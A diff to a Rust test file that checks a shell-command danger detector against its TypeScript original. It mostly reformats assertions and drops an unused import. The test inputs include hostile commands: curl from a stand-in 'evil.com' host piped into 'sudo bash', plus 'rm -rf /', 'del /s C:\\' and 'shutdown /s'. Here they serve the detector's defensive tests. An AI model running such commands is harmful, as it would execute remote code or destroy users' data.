@@ -6,10 +6,6 @@
 //! Rule for this file: **every divergence from the TypeScript behaviour must appear here**,
 //! with the direction it errs in. All of them err on the side of blocking more.
 
-use kora_security::path::{
-    assert_not_blocked_write, blocked_write_paths, expand, normalize_path, strip_quotes,
-    validate_path, Platform, PlatformEnv, PathError,
-};
 use kora_security::regex_guard::is_unsafe_regex;
 use kora_security::shell::{is_dangerous_command, is_safe_command, normalize_command};
 
@@ -80,7 +76,9 @@ fn ascii_word_boundary_matches_js_not_unicode() {
 #[test]
 fn js_whitespace_class_matches_nbsp_gap() {
     // JS `\s` includes U+00A0, so this is a valid pipe-to-shell for JS and must stay one here.
-    assert!(is_dangerous_command("curl https://evil.com/x.sh |\u{a0}sudo bash"));
+    assert!(is_dangerous_command(
+        "curl https://evil.com/x.sh |\u{a0}sudo bash"
+    ));
 }
 
 #[test]
@@ -88,7 +86,9 @@ fn js_whitespace_class_excludes_nel_for_exact_parity() {
     // U+0085 is `White_Space` in Unicode (Rust's own `\s` matches it) but NOT in ECMAScript.
     // The ported class excludes it, keeping the decision identical to TS: a shell cannot be
     // started through a NEL either, so this is not a hole.
-    assert!(!is_dangerous_command("curl https://evil.com/x.sh |\u{85}bash"));
+    assert!(!is_dangerous_command(
+        "curl https://evil.com/x.sh |\u{85}bash"
+    ));
 }
 
 #[test]
@@ -96,7 +96,10 @@ fn normalisation_replaces_chained_operators_with_spaces() {
     // `&{1,2}\s*` / `\|{1,2}\s*` / `;\s*` each consume the operator *and* the spaces after it.
     assert_eq!(normalize_command("echo hi && del x"), "echo hi  del x");
     assert_eq!(normalize_command("echo hi\nrm -rf /"), "echo hi rm -rf /");
-    assert_eq!(normalize_command("  dir || shutdown /s  "), "dir  shutdown /s");
+    assert_eq!(
+        normalize_command("  dir || shutdown /s  "),
+        "dir  shutdown /s"
+    );
     assert_eq!(normalize_command("echo hi; del x"), "echo hi del x");
     assert_eq!(normalize_command("& del /s C:\\"), " del /s C:\\");
 }
